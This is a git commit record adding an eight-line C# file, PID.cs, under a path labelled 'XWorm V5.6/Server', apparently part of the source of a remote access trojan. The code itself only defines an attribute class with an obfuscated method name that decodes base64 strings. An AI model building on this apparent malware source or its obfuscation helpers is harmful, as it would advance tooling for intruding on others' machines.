c2695517e3e15c1acd86536330c93bd9282bcaa0
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:49:48 +0400

    PID.cs

---
+++ XWorm V5.6/Server/PID.cs
@@ -0,0 +1,8 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Text;
+
+internal class EMyPID_8234_ : Attribute
+{
+  public static string XB6DAF26505F50XCDA0767075D0989BD([In] string obj0) => Encoding.UTF8.GetString(Convert.FromBase64String(obj0));
+}
